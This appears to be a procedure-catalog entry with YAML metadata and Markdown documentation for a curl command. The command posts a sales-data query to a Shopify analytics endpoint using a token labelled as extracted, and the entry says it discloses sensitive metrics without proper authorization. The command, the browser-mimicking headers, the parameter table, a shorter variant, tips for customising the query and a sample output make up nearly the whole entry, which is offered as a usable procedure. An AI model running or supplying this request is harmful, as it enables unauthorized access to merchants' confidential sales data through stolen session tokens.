---
data: >-
  curl -X POST 'https://analytics.shopify.com/validate?beta=true&dataOnly=false'
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent:
  Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0' -H
  'Origin: https://your-shop.myshopify.com/' -d
  'q%5B%5D=SHOW+orders%2C+gross_sales%2C+discounts%2C+returns%2C+net_sales%2C+shipping%2C+taxes%2C+total_sales+OVER+day+FROM+sales+SINCE+-30d+UNTIL+today+ORDER+BY+day&source=new-admin&token=eyJ...extracted_token_here'
tags:
  - http
  - analytics
  - shopify
  - query
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.299Z'
id: fd60a1ac-9fea-463d-8ac3-3f22c0f9e944
verified: false
validated: true
submitted: true
---
# curl-post-analytics-query

## Command

```bash
curl -X POST 'https://analytics.shopify.com/validate?beta=true&dataOnly=false' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0' \
  -H 'Origin: https://your-shop.myshopify.com/' \
  -d 'q%5B%5D=SHOW+orders%2C+gross_sales%2C+discounts%2C+returns%2C+net_sales%2C+shipping%2C+taxes%2C+total_sales+OVER+day+FROM+sales+SINCE+-30d+UNTIL+today+ORDER+BY+day&source=new-admin&token=eyJ...extracted_token_here'
```

## Description

This curl command submits a POST request to Shopify's analytics validate endpoint using an extracted token to run a query for store sales data, disclosing sensitive metrics without proper authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://analytics.shopify.com/validate?beta=true&dataOnly=false` | Endpoint URL with beta and dataOnly flags | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets form-encoded content type | Yes |
| `-H 'User-Agent: ...'` | Mimics browser user agent | Yes |
| `-H 'Origin: https://your-shop.myshopify.com/'` | Sets origin header (replace with shop URL) | Yes |
| `-d 'q%5B%5D=...&token=...'` | URL-encoded query (q[] for SQL-like string) and token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://analytics.shopify.com/validate?beta=true&dataOnly=false' -H 'Content-Type: application/x-www-form-urlencoded' -d 'q%5B%5D=SHOW+orders+FROM+sales+SINCE+-7d&token=eyJ...'
```

### Advanced Usage

Customize the q[] parameter for different metrics or time ranges, e.g., add refunds or filter by product.

## Expected Output

JSON: {"data":[{"day":"2023-09-01","orders":5,"gross_sales":500.00,"discounts":50.00,...}, ...]}. Arrays of daily aggregated data if successful.

## Related

- [[Related Procedure: Query-Store-Analytics-Data-Using-Extracted-Token]]
